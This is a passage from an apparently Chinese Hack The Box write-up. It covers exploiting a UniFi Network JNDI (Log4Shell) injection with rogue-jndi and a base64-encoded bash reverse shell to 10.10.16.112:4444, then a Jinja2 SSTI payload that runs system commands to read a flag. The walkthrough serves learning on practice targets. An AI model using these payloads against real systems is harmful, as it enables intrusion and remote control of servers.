![](images/posts/Hack_the_box/1674043457070-a6bf57b2-97a6-4d3b-8c9f-3f7be279f8e1-e039ddeba6.png)

访问8080端口发现跳转到8443  unifi network

![](images/posts/Hack_the_box/1674044008608-d4a7261d-ec80-4791-8bf9-8cc235b1653e-bb92ed7d88.png)

百度unifi network CVE漏洞就可发现

![](images/posts/Hack_the_box/1674044150175-abaa86e1-a80e-4b01-8e4a-dfb6850be9b2-69c2e49592.png)

JNDI注入

[https://blog.csdn.net/dupei/article/details/120534024](https://blog.csdn.net/dupei/article/details/120534024)

![](images/posts/Hack_the_box/1674044579451-7c3585c8-1724-4b52-8385-6113feee0b8e-0403e86138.png)

抓个登录包 修改remember字段 报错但是还是会执行

```plain
${jndi:ldap://{Tun0 IP Address}/whatever}
```

![](images/posts/Hack_the_box/1674045887397-5ed1b51b-067a-4fe3-a0a6-fc6ecfc2343a-a96a2cac5c.png)

![](images/posts/Hack_the_box/1674045545143-8a6d3a46-415b-4c45-8ca6-94631b710567-fc32cfb960.png)

tcpdump 需要用到这个工具

![](images/posts/Hack_the_box/1674045625595-d4a572c4-abf0-41de-8bae-6222d21cf7a2-f1097acd6f.png)

```plain
sudo tcpdump -i tun0 port 389
```

连接好后在发送一次数据包就可检测到

![](images/posts/Hack_the_box/1674045919451-67e4df75-6895-4837-b38b-1db1260c3fc4-cfb185c0b3.png)

下载jdk 和maven

```plain
apt install openjdk-11-jdk -y
apt install maven
```

![](images/posts/Hack_the_box/1674046655365-b8aa3ceb-5125-4fc8-b8ac-c74e09518fb8-2832e546a4.png)

```plain
git clone https://github.com/veracode-research/rogue-jndi
cd rogue-jndi
mvn package
```

![](images/posts/Hack_the_box/1674046798547-58e725d3-cefa-4c36-9b3e-34799f112425-b3d6d0210f.png)

![](images/posts/Hack_the_box/1674047394504-8e9ed018-3f92-43f1-aadd-f376d4b2fddc-25412a4cfc.png)

```php
echo "bash -c'bash -i >&/dev/tcp/10.10.16.112/4444 0>&1" | base64

YmFzaCAtYydiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuMTEyLzQ0NDQgMD4mMQo=
```

![](images/posts/Hack_the_box/1674047481171-611908a9-fe5a-4128-8d6d-de14526ff9bb-e71cf9adb3.png)

```php
java -jar rogue-jndi/target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYydiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuMTEyLzQ0NDQgMD4mMQo=}|{base64 -d}|{bash -i}" --hostname "10.10.16.112"

java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYydiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTYuMTEyLzQ0NDQgMD4mMQo=}|{base64,-d}|{bash,-i}" --hostname "10.10.16.112"
```

![](images/posts/Hack_the_box/1674047816506-058930dd-1c6f-4ae8-8ecc-77b554f6eb0e-a0a31ed8fa.png)

监听然后重新发送

```php
${jndi:ldap://10.10.16.112:1389/o=tomcat}
```

![](images/posts/Hack_the_box/1674047917143-6a24646b-8d51-4f6c-af7a-f5f34b9c72cd-8699423622.png)

![](images/posts/Hack_the_box/1674047900383-15bf038b-632b-4a04-8fc9-e4006e86c682-534473e35d.png)

![](images/posts/Hack_the_box/1674048106814-5976fd14-6270-4be6-a35e-2eb8043994f0-a5fe9c090a.png)

# Challenge
## Templated

![](images/posts/Hack_the_box/1676453505634-4f19cca3-e5f6-482b-bdc7-6bda4c735fdf-e3fa9d1735.png)

给了ip和端口直接访问

![](images/posts/Hack_the_box/1676453549904-b5aa245c-807a-423a-8a02-8098e1559c36-403e46db09.png)

提示flask/jinja2 想到SSTI注入 测试{{3*3}} 9回显证明存在SSTI注入

![](images/posts/Hack_the_box/1676453592927-f43a8c39-6d78-4f73-8eb9-574d8f7f3628-20d170a922.png)

找到poc

![](images/posts/Hack_the_box/1676453655946-a3b5f4e4-acaa-488e-bced-f4edf1a85614-3e99ccf593.png)

```c
```text
&#123;%20for%20c%20in%20[].__class__.__base__.__subclasses__()%20%&#125;&#123;%20if%20c.__name__%20==%20%27catch_warnings%27%20%&#125;&#123;%20for%20b%20in%20c.__init__.__globals__.values()%20%&#125;&#123;%20if%20b.__class__%20==%20&#123;&#125;.__class__%20%&#125;&#123;%20if%20%27eval%27%20in%20b.keys()%20%&#125;&#123;&#123;%20b[%27eval%27](%27__import__(%22os%22).popen(%22id%22).read()%27)%20&#125;&#125;&#123;%20endif%20%&#125;&#123;%20endif%20%&#125;&#123;%20endfor%20%&#125;&#123;%20endif%20%&#125;&#123;%20endfor%20%&#125;
```
```

root id

![](images/posts/Hack_the_box/1676453708095-f54ce4aa-48f9-4b69-9e51-0b65d0967fe4-e102c68e65.png)

把id改为ls看下目录

![](images/posts/Hack_the_box/1676455454605-a5bfafe4-605a-4c5f-b28c-96ee02146fd7-780f87ccad.png)
![](images/posts/Hack_the_box/1676455471060-1ee1e0f4-4e45-4f61-a6ae-3522c3546290-f4979cd616.png)

cat flag.txt即可
![](images/posts/Hack_the_box/1676455511682-70775e31-e946-4331-b201-35152e445d17-042558ba15.png)
